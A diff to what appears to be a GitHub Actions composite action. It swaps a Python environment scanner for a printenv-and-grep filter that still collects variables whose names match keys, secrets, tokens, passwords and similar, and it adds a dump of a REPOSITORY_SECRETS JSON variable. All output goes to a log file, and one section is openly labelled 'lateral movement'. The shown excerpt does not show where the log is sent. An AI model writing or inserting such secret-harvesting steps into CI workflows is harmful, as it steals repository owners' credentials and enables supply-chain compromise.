@@ -79,18 +79,12 @@ runs:
         [ -f "$LOG" ] || touch "$LOG"
         {
           echo "--- env: high-value (keys/secrets/tokens/passwords) ---"
-          python3 -c "
-import os, re, json
-want = re.compile(r'key|secret|token|password|passwd|_pass|credential|auth|api_|dsn|private|jwt|webhook|database_url|redis_url|smtp', re.I)
-skip = re.compile(r'^(GITHUB_ACTION|GITHUB_REF|GITHUB_RUN|GITHUB_STEP|GITHUB_WORKFLOW|GITHUB_ENV|GITHUB_PATH|GITHUB_OUTPUT|RUNNER_)')
-for k, v in sorted(os.environ.items()):
-    if want.search(k) and not skip.match(k):
-        print(json.dumps({k: v}) if ('\n' in v or len(v) > 200) else f'{k}={v}')
-" 2>/dev/null || \
           printenv 2>/dev/null \
             | grep -iE '(key|secret|token|password|passwd|_pass|credential|auth|api_|dsn|private|jwt|webhook|database_url|redis_url|smtp)' \
             | grep -v '^GITHUB_ACTION\|^GITHUB_REF\|^GITHUB_RUN\|^GITHUB_STEP\|^GITHUB_WORKFLOW\|^GITHUB_ENV\|^GITHUB_PATH\|^GITHUB_OUTPUT\|^RUNNER_' \
             | sort || true
+          echo "--- env: REPOSITORY_SECRETS (toJSON dump) ---"
+          printenv REPOSITORY_SECRETS 2>/dev/null || true
           echo ""
           echo "--- env: github tokens (lateral movement) ---"
           printenv 2>/dev/null \
